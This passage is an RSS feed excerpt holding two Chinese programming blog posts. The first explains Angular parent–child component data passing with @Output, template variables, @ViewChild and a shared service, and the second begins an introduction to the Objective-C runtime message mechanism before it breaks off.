&lt;span class=&quot;im&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; DemoParentComponent &lt;span class=&quot;kw&quot;&gt;implements&lt;/span&gt; DemoParent &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;dt&quot;&gt;paramOneVal&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'传递给paramOne的数据'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;dt&quot;&gt;paramTwoVal&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'传递给paramTwo的数据'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后在子组件中就可通过DemoParent这个标识找到父组件的示例了，示例代码如下：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;@&lt;span class=&quot;at&quot;&gt;Component&lt;/span&gt;(&lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'demo-child'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;vs&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;p&amp;gt;{{paramOne}}&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;p&amp;gt;{{paramTwo}}&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;  `&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;)
&lt;span class=&quot;im&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; DemoChildComponent &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;dt&quot;&gt;paramOne&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;dt&quot;&gt;paramTwo&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;at&quot;&gt;constructor&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;demoParent&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; DemoParent) &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;co&quot;&gt;// 通过父组件实例demoParent获取数据&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;paramOne&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;demoParent&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;paramOneVal&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;paramTwo&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;demoParent&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;paramTwoVal&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;子组件向父组件传递&quot;&gt;子组件向父组件传递&lt;/h2&gt;
&lt;p&gt;依然先定义两个组件，分别为&lt;code&gt;子组件DemoChildComponent&lt;/code&gt;和&lt;code&gt;父组件DemoParentComponent&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;子组件：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;@&lt;span class=&quot;at&quot;&gt;Component&lt;/span&gt;(&lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'demo-child'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;vs&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;p&amp;gt;子组件DemoChildComponent&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;  `&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;)
&lt;span class=&quot;im&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; DemoChildComponent &lt;span class=&quot;kw&quot;&gt;implements&lt;/span&gt; OnInit &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;dt&quot;&gt;readyInfo&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; string &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'子组件DemoChildComponent初始化完成！'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
    @&lt;span class=&quot;at&quot;&gt;Output&lt;/span&gt;() &lt;span class=&quot;dt&quot;&gt;ready&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; EventEmitter &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; EventEmitter&lt;span class=&quot;op&quot;&gt;&amp;lt;&lt;/span&gt;any&lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt;()&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 输出属性&lt;/span&gt;
    
    &lt;span class=&quot;at&quot;&gt;ngOnInit&lt;/span&gt;() &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;va&quot;&gt;ready&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;emit&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;readyInfo&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;父组件：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;@&lt;span class=&quot;at&quot;&gt;Component&lt;/span&gt;(&lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'demo-parent'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;vs&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;demo-child (ready)=&quot;onReady($event)&quot; #demoChild&amp;gt;&amp;lt;/demo-child&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;        &amp;lt;!-- 通过本地变量获取readyInfo属性，显示：子组件DemoChildComponent初始化完成！ --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;        readyInfo: {{demoChild.readyInfo}}&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;        &amp;lt;!-- 通过组件类获取子组件示例，然后获取readyInfo属性，显示：子组件DemoChildComponent初始化完成！ --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;        readyInfo: {{demoChildComponent.readyInfo}}&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;  `&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;)
&lt;span class=&quot;im&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; DemoParentComponent &lt;span class=&quot;kw&quot;&gt;implements&lt;/span&gt; AfterViewInit &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;co&quot;&gt;// @ViewChild('demoChild') demoChildComponent: DemoChildComponent; // 通过模板别名获取&lt;/span&gt;
    @&lt;span class=&quot;at&quot;&gt;ViewChild&lt;/span&gt;(DemoChildComponent) &lt;span class=&quot;dt&quot;&gt;demoChildComponent&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; DemoChildComponent&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 通过组件类型获取&lt;/span&gt;
    
    &lt;span class=&quot;at&quot;&gt;ngAfterViewInit&lt;/span&gt;() &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;va&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;va&quot;&gt;demoChildComponent&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;readyInfo&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 打印结果：子组件DemoChildComponent初始化完成！&lt;/span&gt;
    &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;at&quot;&gt;onReady&lt;/span&gt;(&lt;span class=&quot;dt&quot;&gt;evt&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any) &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;va&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;log&lt;/span&gt;(evt)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 打印结果：子组件DemoChildComponent初始化完成！&lt;/span&gt;
    &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;父组件监听子组件的事件&quot;&gt;父组件监听子组件的事件&lt;/h4&gt;
&lt;p&gt;子组件暴露一个 EventEmitter 属性，当事件发生时，子组件利用该属性 emits(向上弹射)事件。父组件绑定到这个事件属性，并在事件发生时作出回应。&lt;/p&gt;
&lt;p&gt;在上面定义好的子组件和父组件，我们可以看到：&lt;/p&gt;
&lt;p&gt;子组件通过&lt;code&gt;@Output()&lt;/code&gt;定义输出属性&lt;code&gt;ready&lt;/code&gt;，然后在ngOnInit中利用ready属性的 emits(向上弹射)事件。&lt;/p&gt;
&lt;p&gt;父组件在其模板中通过选择器&lt;code&gt;demo-child&lt;/code&gt;引用&lt;code&gt;子组件DemoChildComponent&lt;/code&gt;，并绑定了一个事件处理器(onReady())，用来响应子组件的事件($event)并打印出数据（onReady($event)中的$event是固定写法，框架(Angular)把事件参数(用 $event 表示)传给事件处理方法）。&lt;/p&gt;
&lt;h4 id=&quot;父组件与子组件通过本地变量模板变量互动&quot;&gt;父组件与子组件通过本地变量（模板变量）互动&lt;/h4&gt;
&lt;p&gt;父组件不能使用数据绑定来读取子组件的属性或调用子组件的方法。但可以在父组件模板里，新建一个本地变量来代表子组件，然后利用这个变量来读取子组件的属性和调用子组件的方法。&lt;/p&gt;
&lt;p&gt;在上面定义好的子组件和父组件，我们可以看到：&lt;/p&gt;
&lt;p&gt;父组件在模板&lt;code&gt;demo-child&lt;/code&gt;标签上定义了一个&lt;code&gt;demoChild&lt;/code&gt;本地变量，然后在模板中获取子组件的属性：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode html&quot;&gt;
&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;co&quot;&gt;&amp;lt;!-- 获取子组件的属性readyInfo，显示：子组件DemoChildComponent初始化完成！ --&amp;gt;&lt;/span&gt;
    readyInfo: {{demoChild.readyInfo}}
&lt;span class=&quot;kw&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;父组件调用viewchild&quot;&gt;&lt;a href=&quot;mailto:父组件调用@viewchild&quot;&gt;父组件调用@ViewChild&lt;/a&gt;()&lt;/h4&gt;
&lt;p&gt;本地变量方法是个简单便利的方法。但是它也有局限性，因为父组件-子组件的连接必须全部在父组件的模板中进行。父组件本身的代码对子组件没有访问权。&lt;/p&gt;
&lt;p&gt;如果父组件的类需要读取子组件的属性值或调用子组件的方法，就不能使用本地变量方法。&lt;/p&gt;
&lt;p&gt;当父组件类需要这种访问时，可以把子组件作为 ViewChild，注入到父组件里面。&lt;/p&gt;
&lt;p&gt;在上面定义好的子组件和父组件，我们可以看到：&lt;/p&gt;
&lt;p&gt;父组件在组件类中通过&lt;code&gt;@ViewChild()&lt;/code&gt;获取到子组件的实例，然后就可以在模板或者组件类中通过该实例获取子组件的属性：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode html&quot;&gt;
&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;co&quot;&gt;&amp;lt;!-- 通过组件类获取子组件示例，然后获取readyInfo属性，显示：子组件DemoChildComponent初始化完成！ --&amp;gt;&lt;/span&gt;
    readyInfo: {{demoChildComponent.readyInfo}}
&lt;span class=&quot;kw&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;at&quot;&gt;ngAfterViewInit&lt;/span&gt;() &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;va&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;va&quot;&gt;demoChildComponent&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;readyInfo&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 打印结果：子组件DemoChildComponent初始化完成！&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;通过服务传递&quot;&gt;通过服务传递&lt;/h2&gt;
&lt;p&gt;Angular的服务可以在模块注入或者组件注入（均通过&lt;code&gt;providers&lt;/code&gt;注入）。&lt;/p&gt;
&lt;p&gt;在模块中注入的服务在整个Angular应用都可以访问（除&lt;a href=&quot;https://angular.cn/guide/lazy-loading-ngmodules&quot;&gt;惰性加载的模块&lt;/a&gt;）。&lt;/p&gt;
&lt;p&gt;在组件中注入的服务就只能该组件和其子组件进行访问，这个组件子树之外的组件将无法访问该服务或者与它们通讯。&lt;/p&gt;
&lt;p&gt;下面的示例就以在组件中注入的服务来进行父子组件之间的数据传递：&lt;/p&gt;
&lt;p&gt;通讯的服务：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;@&lt;span class=&quot;at&quot;&gt;Injectable&lt;/span&gt;()
&lt;span class=&quot;im&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; CallService &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;dt&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; string &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'我是CallService的info'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;父组件：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;12&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;@&lt;span class=&quot;at&quot;&gt;Component&lt;/span&gt;(&lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'demo-parent'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;vs&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;demo-child&amp;gt;&amp;lt;/demo-child&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;button (click)=&quot;changeInfo()&quot;&amp;gt;父组件改变info&amp;lt;/button&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;        &amp;lt;!-- 显示：我是CallService的info --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;        {{callService.info}}&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;  `&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;providers&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; [CallService]
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;)
&lt;span class=&quot;im&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; DemoParentComponent &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;at&quot;&gt;constructor&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;callService&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; CallService) &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;va&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;va&quot;&gt;callService&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;info&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 打印结果：我是CallService的info&lt;/span&gt;
    &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;at&quot;&gt;changeInfo&lt;/span&gt;() &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;va&quot;&gt;callService&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'我是被父组件改变的CallService的info'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;子组件：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;@&lt;span class=&quot;at&quot;&gt;Component&lt;/span&gt;(&lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'demo-child'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;vs&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;button (click)=&quot;changeInfo()&quot;&amp;gt;子组件改变info&amp;lt;/button&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;  `&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;)
&lt;span class=&quot;im&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; DemoChildComponent &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;at&quot;&gt;constructor&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;callService&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; CallService) &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;va&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;va&quot;&gt;callService&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;info&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 打印结果：我是CallService的info&lt;/span&gt;
    &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;at&quot;&gt;changeInfo&lt;/span&gt;() &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;va&quot;&gt;callService&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'我是被子组件改变的CallService的info'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上面的代码中，我们定义了一个CallService服务，在其内定义了info属性，后面将分别在父子组件通过修改这个属性的值达到父子组件互相传递数据的目的。&lt;/p&gt;
&lt;p&gt;然后通过DemoParentComponent的&lt;code&gt;providers&lt;/code&gt;元数据数组提供CallService服务的实例，并通过构造函数分别注入到父子组件中。&lt;/p&gt;
&lt;p&gt;此时，通过&lt;code&gt;父组件改变info按钮&lt;/code&gt;或&lt;code&gt;子组件改变info按钮&lt;/code&gt;在父组件或子组件中改变CallService服务的info属性值，然后在页面可看到改变之后对应的info属性值。&lt;/p&gt;
</description>
<pubDate>Sat, 24 Mar 2018 07:36:00 +0000</pubDate>
<dc:creator>laixiangran</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/laixiangran/p/8639257.html</dc:identifier>
</item>
<item>
<title>Runtime的使用 - 鸿鹄当高远</title>
<link>http://www.cnblogs.com/jukaiit/p/5242211.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jukaiit/p/5242211.html</guid>
<description>&lt;h3&gt;一、RunTime简介&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;RunTime简称运行时。OC就是&lt;span&gt;&lt;code&gt;运行时机制&lt;/code&gt;&lt;/span&gt;，也就是在运行时候的一些机制，其中最主要的是&lt;span&gt;消息机制&lt;/span&gt;。&lt;/li&gt;
&lt;li&gt;对于C语言，&lt;span&gt;&lt;code&gt;函数的调用在编译的时候会决定调用哪个函数&lt;/code&gt;&lt;/span&gt;。&lt;/li&gt;
&lt;li&gt;对于OC的函数，&lt;span&gt;属于&lt;code&gt;动态调用过程&lt;/code&gt;，在编译的时候并不能决定真正调用哪个函数，只有在真正运行的时候才会根据函数的名称找到对应的函数来调用&lt;/span&gt;。&lt;/li&gt;
&lt;li&gt;事实证明：
&lt;ul&gt;&lt;li&gt;在编译阶段，OC可以&lt;code&gt;调用任何函数&lt;/code&gt;，即使这个函数并未实现，只要声明过就不会报错。&lt;/li&gt;
&lt;li&gt;在编译阶段，C语言调用&lt;code&gt;未实现的函数&lt;/code&gt;就会报错。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;二、Runtime作用&lt;/h3&gt;
&lt;h4&gt;1.发送消息&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;方法调用的本质，就是让对象发送消息。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;objc_msgSend,只有对象才能发送消息，因此以objc开头.&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;消息机制&lt;/code&gt;前提，必须导入#import &amp;lt;objc/message.h&amp;gt;&lt;/li&gt;
&lt;li&gt;消息机制简单使用&lt;/li&gt;
&lt;li&gt;clang -rewrite-objc main.m 查看最终生成代码&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建person对象&lt;/span&gt;
    Person *p =&lt;span&gt; [[Person alloc] init];

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 调用对象方法&lt;/span&gt;
&lt;span&gt;    [p eat];

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 本质：让对象发送消息&lt;/span&gt;
&lt;span&gt;    objc_msgSend(p, @selector(eat));

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 调用类方法的方式：两种
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 第一种通过类名调用&lt;/span&gt;
&lt;span&gt;    [Person eat];
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 第二种通过类对象调用&lt;/span&gt;
    [[Person &lt;span&gt;class&lt;/span&gt;&lt;span&gt;] eat];

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 用类名调用类方法，底层会自动把类名转换成类对象调用
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 本质：让类对象发送消息&lt;/span&gt;
    objc_msgSend([Person &lt;span&gt;class&lt;/span&gt;], @selector(eat));
&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;&lt;li&gt;消息机制原理:对象根据方法编号SEL去映射表查找对应的方法实现&lt;/li&gt;
&lt;/ul&gt;&lt;h4&gt;2.交换方法&lt;/h4&gt;
